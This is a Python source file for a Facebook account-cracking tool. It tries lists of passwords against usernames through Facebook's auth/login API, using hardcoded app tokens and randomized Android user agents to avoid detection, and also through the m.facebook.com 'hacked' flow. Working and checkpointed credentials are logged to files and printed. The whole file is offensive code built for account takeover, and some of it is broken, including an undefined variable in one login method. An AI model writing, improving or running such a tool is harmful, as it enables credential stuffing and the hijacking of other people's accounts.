import base64
import random
import struct
import datetime
import binascii
from src.module import *
from Cryptodome.Cipher import AES
from Cryptodome import Random as RDM
from nacl.public import PublicKey as PK
from nacl.public import SealedBox as SB


class Crack(object):
    def __init__(self, url: str = None):
        self._url = url

    def encpass(self, key, password) -> str:
        try:
            for pke, kid in key:
                rdb = RDM.get_random_bytes(32)
                wkt = int(datetime.datetime.now().timestamp())
                dpt = AES.new(rdb, AES.MODE_GCM, nonce=bytes([0] * 12), mac_len=16)
                dpt.update(str(wkt).encode("utf-8"))
                epw, ctg = dpt.encrypt_and_digest(password.encode("utf-8"))
                sld = SB(PK(binascii.unhexlify(str(pke)))).encrypt(rdb)
                ecp = base64.b64encode(
                    bytes(
                        [
                            1,
                            int(kid),
                            *list(struct.pack("<h", len(sld))),
                            *list(sld),
                            *list(ctg),
                            *list(epw),
                        ]
                    )
                ).decode("utf-8")
                return "#PWD_BROWSER:5:%s:%s" % (wkt, ecp)
        except Exception as e:
            exit(e)
            
    def Data(self, response):
        soup = BeautifulSoup(response.text, "html.parser")
        form = soup.find("form", method="post")
        data = {_.get("name"):_.get("value") for _ in form.findAll("input", attrs={"type": "hidden"})}
        return {"data": data, "next": form.get("action")}

    def login(self, username: str = None, password: list = None, count: list = None):
        if self._url == "mbasic.facebook.com":
            self.loginMbasic(username=username, password=password, count=count)
        else:
            self.loginBapi(username=username, password=password, count=count)
        return {"status": "success", "cp": self.cp, "ok": self.ok}

    @property
    def random_ua(self):
        rr = random.randint
        rc = random.choice
        webkit_version = "Dalvik/2.1.0"
        device = rc(
            ["8.0.0", "9", "10", "11", "12", "13", "11.0", "4.4.2", "8.1.0", "5.5.2"]
        )
        chrome = f"{str(rr(30,115))}.0.{str(rr(4000,4444))}.{str(rr(45,150))}"
        apps_version = f"{str(rr(300,410))}.0.0.{str(rr(3,99))}.{str(rr(45,150))}"
        density = "density=2.55,width=1080,height=1798"
        model = rc(["CPH", "RMX", "V", "SM-G", "X", "LG-"])
        model2 = rc(
            [
                "oppo",
                "realme",
                "samsung",
                "vivo",
                "OPPO",
                "INFINIX",
                "Nokia",
                "Xiaomi",
                "Nexus",
                "Huawei",
            ]
        )
        cecek = rc(
            [
                "XL AXIATA",
                "AXIS",
                "SMARTFREN",
                "3SINYAL KUAT",
                "TSEL PAKAI-MASKER",
                "Indosat",
            ]
        )
        rl = rc(["com.facebook.orca", "com.facebook.mlite", "com.facebook.katana"])
        return (
            f"{webkit_version} (Linux; U; Android {device}; {model}{str(rr(10,30))}{str(rr(10,40))} Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/{chrome};FBPN/{rl};FBLC/in_ID;FBBV/{str(rr(400000000,444444444))};FBCR/{cecek};FBMF/{model2};FBBD/{model2};FBDV/{model}{str(rr(10,30))}{str(rr(10,40))};FBSV/{device};FBCA/arm64-v8a:null;FBDM/"
            + "{density=2.75,width=1080,height=2226};FB_FW/1;]"
        )


class Login(Crack):
    def __init__(self, url: str = None):
        super().__init__(url=url)
        self.ok = 0
        self.cp = 0
        self.count = 0

    def loginBapi(
        self, username: str = None, password: list = None, count: list = None
    ) -> str:
        ua = self.random_ua
        with requests.Session() as session:
            for pw in password:
                app = random.choice(
                    [
                        "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
                        "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                        "1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae",
                        "1348564698517390|007c0a9101b9e1c8ffab727666805038",
                    ]
                )
                akes = random.choice(
                    [
                        "fc0a7caa49b192f64f6f5a6d9643bb28",
                        "62f8ce9f74b12f84c123cc23437a4a32",
                        "c1e620fa708a1d5696fb991c1bde5662",
                        "afb3e4a6d8b868314cc843c21eebc6ae",
                        "007c0a9101b9e1c8ffab727666805038",
                    ]
                )
                params = {
                    "access_token": app,
                    "sdk_version": {random.randint(1, 26)},
                    "email": username,
                    "locale": "en_US",
                    "password": pw,
                    "sdk": "android",
                    "generate_session_cookies": "1",
                    "sig": akes,
                }
                headers = {
                    "Host": self._url,
                    "x-fb-connection-bandwidth": str(
                        random.randint(20000000, 30000000)
                    ),
                    "x-fb-sim-hni": str(random.randint(20000, 40000)),
                    "x-fb-net-hni": str(random.randint(20000, 40000)),
                    "x-fb-connection-quality": "EXCELLENT",
                    "user-agent": ua,
                    "content-type": "application/x-www-form-urlencoded",
                    "x-fb-http-engine": "Liger",
                }
                post = session.post(
                    f"https://{self._url}/auth/login",
                    params=params,
                    headers=headers,
                    allow_redirects=False,
                )
                if "session_key" in post.text and "EAA" in post.text:
                    self.ok += 1
                    open("hasil/ok.txt","a").write(username+"|"+pw+"\n")
                    print(
                        f"\r<OK> user => {username} pw => {pw}                  \n",
                        end="",
                    )
                    print(post.text)
                    break
                elif "User must verify their account" in post.text:
                    self.cp += 1
                    open("hasil/cp.txt","a").write(username+"|"+pw+"\n")
                    print(
                        f"\r<CP> user => {username} pw => {pw}                  \n",
                        end="",
                    )
                    break
            self.count += 1
            print(
                f"\r<die> count => {self.count} / {len(count)} ok => {self.ok} cp => {self.cp} uid^{username}",
                end="",
            )

    def loginMbasic(
        self, username: str = None, password: list = None, count: list = None
    ) -> str:
        with requests.Session() as r:
            for pw in password:
                r.headers.update({
                    "Host": "m.facebook.com",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Connection": "keep-alive",
                })
                
                response = r.get("https://m.facebook.com/hacked")
                data = self.Data(response)
                data["data"]["confirmed"] = "Akun Saya Dibobol"
                
                r.headers.update({"Content-Type": "application/x-www-form-urlencoded","Origin": "m.facebook.com", "Referer": "https://m.facebook.com/hacked", "Content-Length": str(len("&".join(f"{k}={v}" for k,v in data["data"].items())))})
                response = r.post("https://m.facebook.com"+str(data["next"]), data=data["data"])
                data.clear()
                data = self.Data(response)
                data["data"]["email"] = user
                data["data"]["pass"] = pw
                data["data"]["login"] = "Masuk"
                
                r.headers.update({
                    "Referer": "https://m.facebook.com"+str(data["next"]),
                    "Content-Length": str(len("&".join(f"{k}={v}" for k,v in data["data"].items())))
                })
                
                login = r.post("https://m.facebook.com"+str(data["next"]), data=data["data"], allow_redirects=False)
                
                if "c_user" in r.cookies.get_dict():
                    self.ok += 1
                    print(
                        f"\r<OK> user => {username} pw => {pw}                  \n",
                        end="",
                    )
                    break
                elif "checkpoint" in r.cookies.get_dict():
                    self.cp += 1
                    if "Kirim kode" in str(login.text):
                        print(
                            f"\r<CP> user => {username} pw => {pw} a2f                  \n",
                            end="",
                        )
                    else:
                        print(
                            f"\r<CP> user => {username} pw => {pw}                  \n",
                            end="",
                        )
                    break
                else:
                    pass
            self.count += 1
            print(
                f"\r<die> count => {self.count} / {len(count)} ok => {self.ok} cp => {self.cp} uid^{username}",
                end="",
            )
